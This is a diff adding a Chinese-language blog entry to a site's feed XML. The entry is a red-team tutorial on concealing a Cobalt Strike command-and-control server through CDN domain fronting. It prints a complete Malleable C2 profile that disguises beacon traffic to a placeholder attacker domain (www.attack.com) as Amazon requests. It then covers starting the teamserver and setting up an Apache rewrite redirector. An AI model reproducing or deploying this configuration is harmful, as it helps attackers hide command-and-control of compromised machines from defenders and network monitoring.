@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>C2隐匿之域前置</title>
+      <link href="2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/"/>
+      <url>2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/</url>
+      
+        <content type="html"><![CDATA[<p>#Domain Fronting<br>##step1: apache or ngnix<br>首先需要一台前置服务器，以便流量中转。其次，需要利用CDN隐藏ip，理论上可加速。<br><strong>利用CDN转发特性实现域名请求上线</strong><br>有时候修改HTTP包内的Host头字段，会将HTTP包发送给Host指向的那个域名。这就是因为这两个网站域名都是使用了同一家的CDN，而CDN就是通过判断Host头进行流量转发的。<br>很多CDN都存在这个特性。<br>注册好域名与CDN服务后  </p><p><strong>配置相应的C2profile</strong></p><p>配置C2 profile以对应payload的上线请求，我这里直接使用并修改了<a href="https://twitter.com/harmj0y">harmj0y</a> 在github上的项目<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a> 中的amazon.profile。</p><pre><code>set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        metadata &#123;            base64;            prepend &quot;session-token=&quot;;            prepend &quot;skin=noskin;&quot;;            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;            header &quot;Cookie&quot;;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        output &#123;            print;        &#125;    &#125;&#125;http-post &#123;    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Content-Type&quot; &quot;text/xml&quot;;        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        parameter &quot;sz&quot; &quot;160x600&quot;;        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;            parameter &quot;sn&quot;;        &#125;        parameter &quot;s&quot; &quot;3717&quot;;        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.attack.com&quot;;        output &#123;            base64;            print;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;        output &#123;            print;        &#125;    &#125;&#125;</code></pre><p>这里将Host修改成我们申请到的域名就行了(example:<a href="http://www.attack.com),随后启动指定了profile配置的teamserver./">www.attack.com)，随后启动指定了Profile配置的teamserver。</a></p><p>完成之后，当目标执行payload 对你的域名 attack.com 发起 <a href="http://xxxx/">http://xxxx</a> 请求</p><p><img src="/images/DomainFronting/tcp-connet.jpg" alt="test"></p><p>此时需要域前置将请求转发到真正的C2-server.<br>##step2: 前置服务器的Rewrite</p><p>这里可以利用<a href="https://github.com/threatexpress/cs2modrewrite">脚本</a> 生成apache 的rewrite配置代码。</p><p><a href="https://xz.aliyun.com/t/7758">https://xz.aliyun.com/t/7758</a><br><a href="https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/">https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> C2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>密码保护文件</title>
       <link href="2020/09/22/mi-ma-bao-hu-wen-jian/"/>
       <url>2020/09/22/mi-ma-bao-hu-wen-jian/</url>
